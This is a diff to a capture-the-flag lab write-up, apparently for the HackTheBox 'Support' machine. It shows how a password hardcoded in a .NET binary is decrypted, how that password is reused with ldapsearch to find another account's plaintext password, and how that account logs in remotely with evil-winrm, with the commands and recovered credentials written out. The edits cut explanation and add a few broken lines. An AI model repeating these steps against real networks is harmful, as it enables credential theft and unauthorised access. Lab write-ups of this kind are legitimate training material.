@@ -96,9 +96,7 @@ smb: \> get UserInfo.exe.zip
 getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (328.1 KiloBytes/sec) (average 328.1 KiloBytes/sec)
 ```
 
-Unlike the other portable tools in the share, `UserInfo.exe` is a custom internal utility, making it the most interesting artifact to analyze further.
-
-### Binary Analysis & Credential Recovery
+### Binary Analysis and Credential Recovery
 
 Decompiling the extracted `UserInfo.exe` with `ilspycmd` (a .NET decompiler) recovers the full C# source, including an `LdapQuery` class that authenticates to the domain and a `Protected` class responsible for decrypting a hardcoded, obfuscated password used for that authentication:
 
@@ -142,7 +140,7 @@ namespace UserInfo.Services
 }
 ```
 
-`getPassword()` base64-decodes the `enc_password` blob, then XORs every byte first with a repeating key (`armando`) and then with the constant `0xDF`. The scheme is trivial to reverse in Python:
+`getPassword()` base64-decodes the `enc_password` blob, then XORs every byte first with a repeating key (`armando`) and then with the constant `0xDF`. The scheme is used to reverse the password with a Python script:
 
 ```python
 import base64
@@ -169,10 +167,9 @@ Credentials recovered:
 ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-`UserInfo.exe` uses these credentials to bind to LDAP as `support\ldap`, the same functionality that is reused manually in the next step.
+`UserInfo.exe` uses these credentials to bind to LDAP as the user `support\ldap.
 
 ---
-
 ## Foothold
 
 ### LDAP Enumeration
@@ -183,7 +180,7 @@ The recovered `ldap` credentials are used to authenticate directly to the domain
 ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(&(objectCategory=person)(objectClass=user))"
 ```
 
-Reviewing the dump, the `support` user stands out: its free-text `info` attribute contains a plaintext password, and it is a member of two non-default groups, `Shared Support Accounts` and `Remote Management Users`:
+The `support` user  `info` attribute contains a plaintext password, and it is a member of two non-default groups, `Shared Support Accounts` and `Remote Management Users`:
 
 ```
 # support, Users, support.htb
@@ -216,14 +213,11 @@ sAMAccountType: 805306368
 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
 ```
 
-The remaining ~15 user objects returned by the query (`smith.rosario`, `hernandez.stanley`, `wilson.shelby`, `anderson.damian`, `thomas.raphael`, `levine.leopoldo`, `raven.clifton`, `bardot.mary`, `cromwell.gerard`, `monroe.david`, `west.laura`, `langley.lucy`, `daughtler.mabel`, `stoll.rachelle`, `ford.victoria`, plus the built-in `Administrator`, `Guest`, and `krbtgt` accounts) carry no unusual attributes and are not used further.
-
-`support` being a member of `Remote Management Users` is the key detail: that group is granted WinRM access by default, and its plaintext password is sitting in the `info` field.
+`support` being a member of `Remote Management Users` grants WinRm access by default.
 
 Credentials recovered: `support:Ironside47pleasure40Watchful`
 
 ---
-
 ## User Flag
 
 Accessing WinRM as `support`:
@@ -238,7 +232,6 @@ evil-winrm -i 10.129.50.211 -u support -p Ironside47pleasure40Watchful
 ```
 
 ---
-
 ## Privilege Escalation
 
 ### Enumeration
